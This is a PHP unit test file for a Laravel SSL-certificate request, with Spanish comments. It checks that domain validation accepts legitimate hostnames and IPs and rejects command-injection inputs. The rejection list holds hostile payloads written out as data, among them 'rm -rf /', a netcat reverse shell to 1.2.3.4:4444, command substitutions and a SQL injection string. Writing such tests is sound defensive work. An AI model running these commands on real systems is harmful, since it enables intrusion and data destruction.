<?php

declare(strict_types=1);

namespace Tests\Unit;

use App\Http\Requests\Ssl\StoreSslCertificateRequest;
use Illuminate\Support\Facades\Validator;
use Tests\TestCase;

class SslCertificateValidationTest extends TestCase
{
    /**
     * Valida que dominios legítimos pasen la validación regex RFC 1035.
     */
    public function test_legitimate_fqdn_and_ip_pass_validation(): void
    {
        $validDomains = [
            'nuevo-servicio.empresa.com.ve',
            'subdominio.empresa.local',
            'portal-test.empresa.com.ve',
            'api-gateway.empresa.net',
            '10.20.99.1',
            '192.168.100.254',
        ];

        $rules = (new StoreSslCertificateRequest())->rules();

        foreach ($validDomains as $domain) {
            $validator = Validator::make(
                ['domain' => $domain, 'port' => 443],
                $rules
            );
            $this->assertFalse(
                $validator->errors()->has('domain'),
                "El dominio válido '{$domain}' debería pasar la validación pero falló: " . implode(', ', $validator->errors()->get('domain'))
            );
        }
    }

    /**
     * Valida que payloads de inyección de comandos sean rechazados categóricamente por la regex.
     */
    public function test_command_injection_payloads_are_rejected(): void
    {
        $maliciousPayloads = [
            'google.com; id',
            'evil.com && rm -rf /',
            'test.com | nc -e /bin/bash 1.2.3.4 4444',
            '`reboot`',
            '$(whoami).empresa.com',
            'domain.com\nwhoami',
            'domain.com\' OR \'1\'=\'1',
            'domain with spaces.com',
            'http://domain.com',
            'https://sub.domain.com/path',
        ];

        $rules = (new StoreSslCertificateRequest())->rules();

        foreach ($maliciousPayloads as $payload) {
            $validator = Validator::make(
                ['domain' => $payload, 'port' => 443],
                $rules
            );
            $this->assertTrue(
                $validator->errors()->has('domain'),
                "El payload malicioso '{$payload}' debió ser rechazado por la regla de validación de FQDN."
            );
        }
    }
}
